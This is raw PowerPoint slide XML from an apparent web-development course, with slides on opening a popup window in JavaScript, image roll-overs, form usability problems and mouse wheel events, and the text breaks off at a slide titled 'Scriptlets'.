          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1774825" y="1600200"/>
            <a:ext cx="8642350" cy="4525963"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>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&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"</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"http://www.w3.org/TR/html4/loose.dtd"&gt;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&lt;html&gt;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&lt;head&gt;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&lt;meta http-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1400" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>equiv</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>="content-type" content="text/html; charset=utf-8"&gt;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&lt;title&gt;Create a Window in JavaScript&lt;/title&gt;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&lt;script type="text/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1400" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>javascript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"&gt;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a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1400" b="1" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>function popup() {</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a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1400" b="1" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>new_window</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1400" b="1" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1400" b="1" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>window.open</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1400" b="1" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>('', '',</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'width=600, height=600, scrollbars=1, resizable=1');</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1400" b="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>    var </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1400" b="1" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>wo = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1400" b="1" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>new_window.document</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1400" b="1" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>;</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a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1400" b="1" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>wo.writeln</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1400" b="1" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>('&lt;html&gt;&lt;head&gt;&lt;title&gt;Popup&lt;\/title&gt;&lt;\/head&gt;&lt;body&gt;');</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for(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1400" b="1" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>i</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1400" b="1" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>=1;i&lt;=10;i++) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1400" b="1" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>wo.write</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1400" b="1" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>("&lt;h1&gt;"+</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1400" b="1" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>i</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1400" b="1" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>+"&lt;\/h1&gt;")</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a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1400" b="1" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>wo.writeln</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1400" b="1" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>('&lt;\/body&gt;&lt;\/html&gt;');</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a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1400" b="1" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>wo.close</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1400" b="1" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>();</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1400" b="1" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>  }</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&lt;/script&gt;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&lt;/head&gt;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&lt;body&gt;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&lt;a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1400" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>href</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>="</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1400" b="1" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>javascript:popup</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1400" b="1" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>()</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"&gt;JS Created Content&lt;/a&gt;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  &lt;/body&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1400" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&lt;/html&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="fi-FI" sz="1400" dirty="0">
              <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49"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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DEBAE1FB-F526-48D4-9C40-08573DF9D6BC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Image Roll-Over</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A8F74F6D-86AD-4E1F-92BA-F618A20B3A2D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial" charset="0"/>
              <a:buChar char="•"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Change new image when </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>mouseover</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> event occurs and change back to original image when </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>mouseout</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> event occurs, by manipulating the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> property of the Image object.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> &lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>img</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> id="</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>id_rollover</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src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>="orig.jpg" alt="" </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>onmouseover</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>="document.getElementById('</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>id_rollover</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src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>='rollover.jpg'"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>onmouseout</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>="document.getElementById('</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>id_rollover</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src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>='orig.jpg'"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Courier New" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial" charset="0"/>
              <a:buChar char="•"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Transition can be slow, because when the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>mouseover</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> event occurs, the browser starts to load the image file, unless it is found from cache</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial" charset="0"/>
              <a:buChar char="•"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>The create a smoother user experience create Image objects (new Image) before the page loads (&lt;head&gt;) and assign the roll over images to .</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:cs typeface="Courier New" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> attribute of the Image. This starts up the image loading in background, but doesn't yet guarantee that the image has been loaded.</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6FE3F9C7-6142-4A05-AE93-C5F53EAF240C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Common Usability Problems in Forms</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="125955" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7E0086AD-18FA-4929-BE77-CE9D88DDF873}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>UI elements are too small and close to each other </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI">
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t> use CSS or jQuery Mobile or similar</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="fi-FI"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>No field has focus </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI">
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t> Make sure one form field has autofocus</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI">
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t>Range input field doesn't display value  Combine it with input number field (both affect each other)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI">
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t>Country selection using select option and alphabetic order  Put most commonly used countries first</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="fi-FI">
              <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="fi-FI">
              <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="fi-FI"/>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a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F65E37A9-17D8-425E-9254-59B6E7AF6E6E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Mouse Wheel Events</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="126979" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{90CE0A60-5793-4CAE-9D44-915FF90AD8A3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400">
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>wheel event is supported by modern browsers. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400">
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Event.deltaMode values:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000">
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>0x00	The delta* values are specified in pixels. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000">
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>0x01	The delta* values are specified in lines.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2000">
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>0x02	The delta* values are specified in pages.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" sz="2400">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>document.addEventListener("wheel",  wheelEvent);</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function wheelEvent(e) {</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  e = window.event || e;</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  document.getElementById("result").innerHTML =</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  "deltaX = "+e.deltaX+"&lt;br&gt;"+</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  "deltaY = "+e.deltaY+"&lt;br&gt;"+</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  "deltaMode = "+e.deltaMode;</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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F0980A2C-DFCB-4F34-A8F1-7D01ACF9B419}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>Scriptlets</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="130051" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3DB95089-A2FD-4CB6-9606-FD772230520C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
